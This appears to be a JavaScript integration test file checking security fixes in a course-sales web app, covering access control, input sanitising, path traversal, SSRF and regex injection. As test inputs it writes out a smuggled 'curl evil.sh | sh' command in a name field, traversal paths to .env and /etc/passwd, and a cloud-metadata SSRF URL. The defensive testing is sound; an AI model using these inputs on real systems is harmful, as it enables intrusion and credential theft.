// Regression tests for the access-control / injection fixes. Needs a MongoDB (see mcq.integration.test.mjs).
import test, { before, after } from 'node:test';
import assert from 'node:assert/strict';

const URI = process.env.TEST_MONGODB_URI;

if (!URI) {
  test('security integration tests (skipped: set TEST_MONGODB_URI)', { skip: true }, () => {});
} else {
  process.env.JWT_SECRET = 'test-secret';
  process.env.ADMIN_EMAIL = 'admin@test.dev';
  delete process.env.CALLBACK_SECRET;
  delete process.env.GITHUB_CALLBACK_SECRET;
  delete process.env.LEGACY_INTERESTED_ACCESS;

  const { default: express } = await import('express');
  const { default: mongoose } = await import('mongoose');
  const { startSession } = await import('../utils/session.js');
  const { default: courseRoutes } = await import('../routes/courseRoutes.js');
  const { default: userRoutes } = await import('../routes/userRoutes.js');
  const { default: pdfEditorRoutes } = await import('../routes/pdfEditorRoutes.js');
  const { default: upscRoutes } = await import('../routes/upscRoutes.js');
  const { default: questionRoutes } = await import('../routes/questionRoutes.js');
  const { default: mcqRoutes } = await import('../routes/mcqRoutes.js');
  const { default: User } = await import('../models/User.js');
  const { default: Course } = await import('../models/Course.js');
  const { default: DownloadLog } = await import('../models/DownloadLog.js');
  const { default: UPSCQA } = await import('../models/UPSCQA.js');
  const { default: McqSubjectPricing } = await import('../models/McqSubjectPricing.js');
  const { default: McqPurchaseRequest } = await import('../models/McqPurchaseRequest.js');
  const { default: PurchaseRequest } = await import('../models/PurchaseRequest.js');
  const { default: DownloadRequest } = await import('../models/DownloadRequest.js');
  const { default: ComboOffer } = await import('../models/ComboOffer.js');
  const { openPeopleDb, closePeopleDb, peopleConn, PEOPLE_COLLECTIONS } = await import('../config/peopleDb.js');
  const { isPrivateAddress } = await import('../utils/safeFetch.js');
  const { sanitizePersonName, sanitizeMobile, escapeRegExp } = await import('../utils/sanitize.js');

  let server;
  let base;
  const tokens = {};
  const users = {};
  let course;

  const call = async (method, path, who, body, extraHeaders = {}) => {
    const headers = { ...extraHeaders };
    if (who) headers.Authorization = `Bearer ${tokens[who]}`;
    let payload;
    if (body instanceof FormData) payload = body;
    else if (body !== undefined) { headers['Content-Type'] = 'application/json'; payload = JSON.stringify(body); }
    const res = await fetch(`${base}${path}`, { method, headers, body: payload });
    let data = null;
    try { data = await res.json(); } catch { /* not json */ }
    return { status: res.status, data };
  };

  const makeUser = async (key, email, extra = {}) => {
    users[key] = await User.create({ googleId: `g-${key}`, email, name: key, fullName: key, ...extra });
    // Real login path: students' tokens are only accepted with a live session (utils/session.js).
    tokens[key] = await startSession(users[key], `device-${key}`, 'test');
  };

  before(async () => {
    // Each test file gets its own database so files can run in parallel without wiping each other.
    await mongoose.connect(URI, { dbName: 'security_integration' });
    await mongoose.connection.dropDatabase();
    // Users and purchases live in a second database (a separate cluster in production), so the tests use two as well.
    await openPeopleDb(URI, { dbName: 'security_integration_people' });
    await peopleConn.dropDatabase();
    course = await Course.create({ courseId: 'SOC-1', name: 'Sociology 1', subject: 'Sociology', price: 100, fileName: 'soc.pdf', fileUrl: 'uploads/definitely-missing.pdf' });
    await makeUser('admin', 'admin@test.dev');
    await makeUser('buyer', 'buyer@test.dev', { purchasedCourses: [course._id], interestedCourses: ['SOC-1'] });
    await makeUser('cheater', 'cheater@test.dev');
    await makeUser('legacy', 'legacy@test.dev', { interestedCourses: ['SOC-1'] }); // old-style grant, not in purchasedCourses

    const app = express();
    app.use(express.json());
    app.use('/api/courses', courseRoutes);
    app.use('/api/user', userRoutes);
    app.use('/api/pdf-editor', pdfEditorRoutes);
    app.use('/api/upsc', upscRoutes);
    app.use('/api/questions', questionRoutes);
    app.use('/api/mcq', mcqRoutes);
    await new Promise((resolve) => { server = app.listen(0, resolve); });
    base = `http://127.0.0.1:${server.address().port}`;
  });

  after(async () => {
    await new Promise((resolve) => server.close(resolve));
    await mongoose.disconnect();
    await closePeopleDb();
  });

  // ---------- people / purchase data lives in its own database ----------
  test('users, purchases, download requests/logs, combo offers and UPSC QAs are stored only in the people database', async () => {
    await Promise.all([User, PurchaseRequest, McqPurchaseRequest, DownloadRequest, ComboOffer, UPSCQA, DownloadLog].map((m) => m.init()));
    const names = async (conn) => (await conn.db.listCollections({}, { nameOnly: true }).toArray()).map((c) => c.name);
    const main = await names(mongoose.connection);
    const people = await names(peopleConn);
    for (const c of PEOPLE_COLLECTIONS) {
      assert.ok(people.includes(c), `${c} exists in the people database`);
      assert.ok(!main.includes(c), `${c} must NOT exist in the content database`);
    }
    assert.ok(main.includes('courses') && !people.includes('courses'), 'course content stays in the content database');
    // and real writes land where they should
    assert.equal(await peopleConn.db.collection('users').countDocuments({ email: 'buyer@test.dev' }), 1);
    assert.equal(await mongoose.connection.db.collection('courses').countDocuments({ courseId: 'SOC-1' }), 1);
  });

  test('records that join across the two databases still resolve (purchased courses, purchase requests)', async () => {
    const mine = await call('GET', '/api/courses/purchased', 'buyer');
    assert.equal(mine.status, 200);
    assert.deepEqual(mine.data.purchasedCourses.map((c) => c.courseId), ['SOC-1'], 'a course from the content DB is populated onto a user from the people DB');

    await PurchaseRequest.create({
      userId: users.buyer._id, userEmail: 'buyer@test.dev', userName: 'buyer', courseObjectId: course._id, courseId: 'SOC-1',
      courseName: 'Sociology 1', price: 100, courses: [course._id], screenshotUrl: '/x.png', screenshotData: Buffer.from([1, 2, 3])
    });
    const reqs = await call('GET', '/api/courses/purchase-requests', 'buyer');
    assert.equal(reqs.status, 200);
    assert.equal(reqs.data.length, 1);
    assert.equal(reqs.data[0].courses[0].name, 'Sociology 1');
    assert.equal(reqs.data[0].screenshotData, undefined, 'screenshot bytes are still not sent in the list');
  });

  test('without MONGODB_URI_PEOPLE the people connection refuses to open (the server exits instead of running with no users)', async () => {
    await assert.rejects(() => openPeopleDb(''), /MONGODB_URI_PEOPLE is not defined/);
  });

  // ---------- course management is admin-only ----------
  test('anonymous callers cannot upload, update or delete courses', async () => {
    assert.equal((await call('POST', '/api/courses/upload', null, { courseId: 'X' })).status, 401);
    assert.equal((await call('PUT', `/api/courses/${course._id}`, null, { name: 'hacked' })).status, 401);
    assert.equal((await call('DELETE', `/api/courses/${course._id}`, null)).status, 401);
    assert.ok(await Course.findById(course._id), 'course still exists');
  });

  test('a logged-in student cannot upload, update or delete courses either', async () => {
    assert.equal((await call('DELETE', `/api/courses/${course._id}`, 'cheater')).status, 403);
    assert.equal((await call('PUT', `/api/courses/${course._id}`, 'cheater', { name: 'hacked' })).status, 403);
    assert.equal((await call('POST', '/api/courses/upload', 'cheater', { courseId: 'X' })).status, 403);
    assert.equal((await Course.findById(course._id)).name, 'Sociology 1');
  });

  test('admins pass the gate', async () => {
    const r = await call('DELETE', `/api/courses/${new mongoose.Types.ObjectId()}`, 'admin');
    assert.equal(r.status, 404, 'reached the handler (course simply does not exist)');
  });

  test('the free "mock checkout" endpoint is gone', async () => {
    const r = await call('POST', '/api/courses/checkout', 'cheater', { courseIds: [String(course._id)] });
    assert.equal(r.status, 404);
    assert.equal((await User.findById(users.cheater._id)).purchasedCourses.length, 0);
  });

  // ---------- profile fields ----------
  test('a student cannot grant themselves a course through the profile endpoint', async () => {
    const r = await call('PUT', '/api/user/profile', 'cheater', { fullName: 'Chea Ter', interestedCourses: ['SOC-1'], purchasedCourses: [String(course._id)] });
    assert.equal(r.status, 200);
    const u = await User.findById(users.cheater._id);
    assert.deepEqual([...u.interestedCourses], []);
    assert.deepEqual([...u.purchasedCourses], []);
    assert.equal(u.fullName, 'Chea Ter');
  });

  test('profile names are sanitised (shell/markup characters cannot get into PDFs or workflow inputs)', async () => {
    const r = await call('PUT', '/api/user/profile', 'cheater', { fullName: 'x"; curl evil.sh | sh; "' });
    assert.equal(r.status, 200);
    const stored = (await User.findById(users.cheater._id)).fullName;
    assert.ok(!/["|;$`<>]/.test(stored), `stored: ${stored}`);
    assert.equal((await call('PUT', '/api/user/profile', 'cheater', { fullName: '<<<>>>' })).status, 400);
    assert.equal((await call('PUT', '/api/user/profile', 'cheater', { mobileNumber: 'abc' })).status, 400);
    assert.equal((await call('PUT', '/api/user/profile', 'cheater', { mobileNumber: '+91 98765-43210' })).status, 200);
    assert.equal((await User.findById(users.cheater._id)).mobileNumber, '+919876543210');
  });

  test('sanitisers', () => {
    assert.equal(sanitizePersonName('  Ramānujan   Śrīnivāsa '), 'Ramānujan Śrīnivāsa');
    assert.equal(sanitizePersonName('Bob‮txt'), 'Bob txt');
    assert.equal(sanitizeMobile('12'), '');
    assert.equal(escapeRegExp('a.*b'), 'a\\.\\*b');
  });

  // ---------- who may read/download a course ----------
  test('raw PDF: buyers and admins get in, everyone else is refused', async () => {
    const path = `/api/courses/raw/${course._id}`;
    assert.equal((await call('GET', path, null)).status, 401);
    assert.equal((await call('GET', path, 'cheater')).status, 403);
    assert.equal((await call('GET', path, 'legacy')).status, 403, 'interestedCourses alone no longer counts');
    assert.equal((await call('GET', path, 'buyer')).status, 404, 'access granted - only the (fake) file is missing');
    assert.equal((await call('GET', path, 'admin')).status, 404);
  });

  test('download endpoint applies the same rule', async () => {
    const path = '/api/courses/download/SOC-1?checkOnly=true&index=0';
    assert.equal((await call('GET', path, 'cheater')).status, 403);
    assert.equal((await call('GET', path, 'legacy')).status, 403);
    assert.equal((await call('GET', '/api/courses/download/SOC-1?checkOnly=true&index=abc', 'buyer')).status, 400, 'bad index rejected before any credit is spent');
    assert.equal((await call('GET', '/api/courses/download/SOC-1?checkOnly=true&index=7', 'buyer')).status, 400);
  });

  test('LEGACY_INTERESTED_ACCESS bridge re-enables old accounts only when explicitly switched on', async () => {
    process.env.LEGACY_INTERESTED_ACCESS = 'true';
    assert.equal((await call('GET', `/api/courses/raw/${course._id}`, 'legacy')).status, 404);
    // but the self-service write path is still closed, so nobody can newly grant themselves access
    assert.equal((await call('GET', `/api/courses/raw/${course._id}`, 'cheater')).status, 403);
    delete process.env.LEGACY_INTERESTED_ACCESS;
    assert.equal((await call('GET', `/api/courses/raw/${course._id}`, 'legacy')).status, 403);
  });

  test('admin user editor keeps purchasedCourses in step with the access list (grant AND revoke)', async () => {
    const grant = await call('PUT', `/api/user/admin/users/${users.legacy._id}`, 'admin', { interestedCourses: ['SOC-1'] });
    assert.equal(grant.status, 200);
    assert.deepEqual((await User.findById(users.legacy._id)).purchasedCourses.map(String), [String(course._id)]);
    assert.equal((await call('GET', `/api/courses/raw/${course._id}`, 'legacy')).status, 404, 'now has access');

    await call('PUT', `/api/user/admin/users/${users.legacy._id}`, 'admin', { interestedCourses: [] });
    assert.equal((await User.findById(users.legacy._id)).purchasedCourses.length, 0);
    assert.equal((await call('GET', `/api/courses/raw/${course._id}`, 'legacy')).status, 403, 'revoked');

    assert.equal((await call('PUT', `/api/user/admin/users/${users.legacy._id}`, 'cheater', { interestedCourses: ['SOC-1'] })).status, 403);
  });

  // ---------- PDF editor ----------
  test('PDF editor: login required, and file names cannot escape the edits folder', async () => {
    assert.equal((await call('POST', '/api/pdf-editor/init', null, {})).status, 401);
    assert.equal((await call('GET', '/api/pdf-editor/download/edited-1-1-x.pdf', null)).status, 401);
    assert.equal((await call('GET', '/api/pdf-editor/file/edited-1-1-x.pdf', null)).status, 401);

    for (const evil of ['..%2F..%2F.env', '..%2F..%2Fpackage.json', 'edited-..%2F..%2F.env', '%2Fetc%2Fpasswd', 'package.json']) {
      const d = await call('GET', `/api/pdf-editor/download/${evil}`, 'cheater');
      assert.equal(d.status, 400, `download ${evil} -> ${d.status}`);
      const f = await call('GET', `/api/pdf-editor/file/${evil}`, 'cheater');
      assert.equal(f.status, 400, `file ${evil} -> ${f.status}`);
    }
    const fake = await call('POST', '/api/pdf-editor/apply-whiteout', 'cheater', { editId: '../../.env', pageNumber: 1, box: {}, viewport: { width: 1, height: 1 }, cleanedText: 'x' });
    assert.notEqual(fake.status, 200);
  });

  test('PDF editor: a stranger cannot pull a course PDF through init', async () => {
    const r = await call('POST', '/api/pdf-editor/init', 'cheater', { courseId: String(course._id) });
    assert.equal(r.status, 403);
  });

  // ---------- proxy ----------
  test('proxy-pdf is not an open proxy', async () => {
    const evil = 'http://169.254.169.254/latest/meta-data/';
    assert.equal((await call('GET', `/api/upsc/proxy-pdf?url=${encodeURIComponent(evil)}`)).status, 403, 'unknown URL refused');

    // even a URL that IS in the database is refused if it points inside the network
    await UPSCQA.create({ question_text: 'q', start_page: 1, end_page: 2, file_urls: [{ url: 'http://127.0.0.1:1/x.pdf' }, { url: 'http://169.254.169.254/x.pdf' }] });
    assert.equal((await call('GET', `/api/upsc/proxy-pdf?url=${encodeURIComponent('http://127.0.0.1:1/x.pdf')}`)).status, 400);
    assert.equal((await call('GET', `/api/upsc/proxy-pdf?url=${encodeURIComponent('http://169.254.169.254/x.pdf')}`)).status, 400);
  });

  test('private/loopback/metadata addresses are recognised', () => {
    for (const ip of ['127.0.0.1', '10.1.2.3', '172.16.0.1', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '::1', 'fe80::1', 'fd00::1', '::ffff:127.0.0.1']) {
      assert.equal(isPrivateAddress(ip), true, ip);
    }
    for (const ip of ['8.8.8.8', '1.1.1.1', '151.101.1.69', '2606:4700:4700::1111']) {
      assert.equal(isPrivateAddress(ip), false, ip);
    }
  });

  test('the Gemini-backed question upload is admin only', async () => {
    assert.equal((await call('POST', '/api/questions/upload', null, new FormData())).status, 401);
    assert.equal((await call('POST', '/api/questions/upload', 'cheater', new FormData())).status, 403);
  });

  // ---------- GitHub callback ----------
  test('callback with no secret configured is refused (it used to accept "Bearer undefined")', async () => {
    // (importing the app loads the real .env via dotenv, so make sure no secret is set for this check)
    delete process.env.CALLBACK_SECRET;
    delete process.env.GITHUB_CALLBACK_SECRET;
    const r = await call('POST', '/api/courses/github-callback', null, { status: 'progress', step: 5 }, { Authorization: 'Bearer undefined' });
    assert.equal(r.status, 503);
  });

  test('callback: wrong secret refused; failure refund only works while the license is still queued', async () => {
    process.env.CALLBACK_SECRET = 'cb-secret';
    try {
      const wrong = await call('POST', '/api/courses/github-callback', null, { status: 'failed' }, { Authorization: 'Bearer nope' });
      assert.equal(wrong.status, 401);

      const good = { Authorization: 'Bearer cb-secret' };
      await User.updateOne({ _id: users.buyer._id }, { $set: { downloadLimits: [{ courseId: 'SOC-1', downloadedCount: 1, allowedCount: 1 }] } });
      await DownloadLog.create({ licenseId: 'DH-TEST-AAAA-BBBB', userId: users.buyer._id, userEmail: 'buyer@test.dev', courseId: 'SOC-1', status: 'queued' });
      const body = { status: 'failed', courseId: 'SOC-1', userId: String(users.buyer._id), licenseId: 'DH-TEST-AAAA-BBBB', error: 'boom' };

      assert.equal((await call('POST', '/api/courses/github-callback', null, body, good)).status, 200);
      assert.equal((await User.findById(users.buyer._id)).downloadLimits[0].downloadedCount, 0, 'first failure refunds the credit');
      assert.equal((await DownloadLog.findOne({ licenseId: 'DH-TEST-AAAA-BBBB' })).status, 'failed');

      // replaying the same failure must not refund again
      await User.updateOne({ _id: users.buyer._id }, { $set: { 'downloadLimits.0.downloadedCount': 1 } });
      assert.equal((await call('POST', '/api/courses/github-callback', null, body, good)).status, 200);
      assert.equal((await User.findById(users.buyer._id)).downloadLimits[0].downloadedCount, 1, 'replay is ignored');

      // a completed license cannot be turned into a refund by a late "failed"
      await DownloadLog.create({ licenseId: 'DH-TEST-CCCC-DDDD', userId: users.buyer._id, userEmail: 'buyer@test.dev', courseId: 'SOC-1', status: 'queued' });
      await call('POST', '/api/courses/github-callback', null, { status: 'completed', courseId: 'SOC-1', userId: String(users.buyer._id), licenseId: 'DH-TEST-CCCC-DDDD' }, good);
      assert.equal((await DownloadLog.findOne({ licenseId: 'DH-TEST-CCCC-DDDD' })).status, 'ready');
      await call('POST', '/api/courses/github-callback', null, { ...body, licenseId: 'DH-TEST-CCCC-DDDD' }, good);
      assert.equal((await User.findById(users.buyer._id)).downloadLimits[0].downloadedCount, 1);
    } finally {
      delete process.env.CALLBACK_SECRET;
    }
  });

  // ---------- leak tracing ----------
  test('admin can trace a License ID; students cannot', async () => {
    assert.equal((await call('GET', '/api/courses/admin/download-logs?q=DH-TEST', 'buyer')).status, 403);
    const r = await call('GET', '/api/courses/admin/download-logs?q=DH-TEST-AAAA', 'admin');
    assert.equal(r.status, 200);
    assert.equal(r.data.logs.length, 1);
    assert.equal(r.data.logs[0].userEmail, 'buyer@test.dev');
    // regex characters in the search box are treated literally
    assert.equal((await call('GET', '/api/courses/admin/download-logs?q=.*', 'admin')).data.logs.length, 0);
  });

  // ---------- UPI transaction id ----------
  test('UPI transaction ids are matched literally (no regex injection)', async () => {
    await McqSubjectPricing.create({ subject: 'GS-1', price: 100 });
    await McqPurchaseRequest.create({ userId: users.admin._id, userEmail: 'a@a.a', userName: 'a', purchaseType: 'subject', subject: 'GS-1', price: 100, screenshotUrl: '/x', upiTxnId: 'ABC123456', status: 'rejected' });

    const submit = async (txn) => {
      const form = new FormData();
      form.append('subject', 'GS-1');
      form.append('upiTxnId', txn);
      form.append('screenshot', new Blob([Buffer.from('fake')], { type: 'image/png' }), 's.png');
      return call('POST', '/api/mcq/purchase-requests', 'buyer', form);
    };
    assert.equal((await submit('.*')).status, 200, '".*" must NOT match the existing "ABC123456"');
    await McqPurchaseRequest.deleteMany({ userId: users.buyer._id });
    assert.equal((await submit('abc123456')).status, 400, 'a real duplicate (case-insensitive) is still caught');
  });
}
